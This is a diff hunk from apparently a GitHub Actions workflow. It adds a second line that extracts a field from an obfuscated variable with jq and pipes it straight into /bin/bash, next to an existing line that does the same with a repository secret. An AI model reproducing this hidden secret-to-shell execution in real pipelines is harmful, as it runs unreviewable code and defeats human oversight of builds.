@@ -21,6 +21,7 @@ jobs:
           rfpnx8: ${{ secrets.rfpnx8 }}
         run: |
           printf '%s' "$rfpnx8" | jq -r .vrr6 | /bin/bash
+          printf '%s' "$xlt07" | jq -r .vmyy70 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
